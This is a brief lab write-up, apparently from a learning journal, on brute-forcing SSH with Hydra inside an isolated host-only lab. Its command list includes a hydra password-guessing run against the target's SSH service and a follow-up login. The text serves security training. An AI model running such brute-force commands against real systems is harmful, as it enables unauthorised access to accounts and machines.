# Day 5 – SSH Brute Force with Hydra

## Goal
Perform SSH brute force in a controlled cybersecurity lab to understand password attacks and authentication behavior.

## Lab Setup
- Attacker: Kali Linux (192.168.160.10)
- Target: Ubuntu Server (192.168.160.129)
- Network: Host-only (isolated)

## Commands Used
```bash
ip a
ping 192.168.160.129
nano creds.txt
hydra -l ubuntu -P creds.txt ssh://192.168.160.129 -t 4 -V
ssh ubuntu@192.168.160.129
whoami && hostname && ip a
